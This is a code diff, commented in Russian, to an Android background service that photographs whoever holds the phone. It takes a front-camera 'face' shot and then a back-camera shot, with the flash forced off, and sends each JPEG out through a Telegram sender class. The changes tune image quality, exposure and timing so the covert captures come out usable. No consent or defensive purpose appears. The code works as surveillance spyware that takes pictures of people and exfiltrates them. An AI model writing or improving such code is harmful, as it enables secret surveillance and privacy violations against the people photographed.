@@ -36,7 +36,7 @@ public class CameraService extends Service {
         
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
         
-        // 1. Сначала снимаем лицо
+        // 1. Сначала снимаем лицо (фронталка)
         capturePhoto("face", "1"); 
         return START_NOT_STICKY;
     }
@@ -78,30 +78,31 @@ public class CameraService extends Service {
                         
                         YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, w, h, null);
                         ByteArrayOutputStream out = new ByteArrayOutputStream();
-                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 75, out);
+                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 85, out); 
                         
                         new TelegramSender().send(out.toByteArray(), tag + ".jpg");
                         
                         img.close(); r.close(); device.close();
                         
                         if (tag.equals("face")) {
-                            // После фронталки снимаем заднюю
+                            // ПАУЗА 1 СЕКУНДА И ЗАПУСК ЗАДНЕЙ КАМЕРЫ
                             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                 capturePhoto("back", "0");
                             }, 1000);
                         } else {
-                            stopSelf(); // Всё сделано, служба завершается
+                            stopSelf();
                         }
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                         builder.addTarget(reader.getSurface());
-                        builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF); // Без вспышки
+                        builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF);
+                        builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
 
                         device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override public void onConfigured(CameraCaptureSession s) {
-                                // ДЛЯ ЗАДНЕЙ КАМЕРЫ ЖДЕМ 2 СЕКУНДЫ, ЧТОБЫ УШЕЛ БЕЛЫЙ ЭКРАН
-                                long delay = tag.equals("back") ? 2000 : 500; 
+                                // ГЛАВНЫЙ ФИКС: Для задней камеры ("back") ждем 2 секунды, чтобы убрать белый экран
+                                long delay = tag.equals("back") ? 2000 : 1500; 
                                 
                                 new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                     try { s.capture(builder.build(), null, null); } 
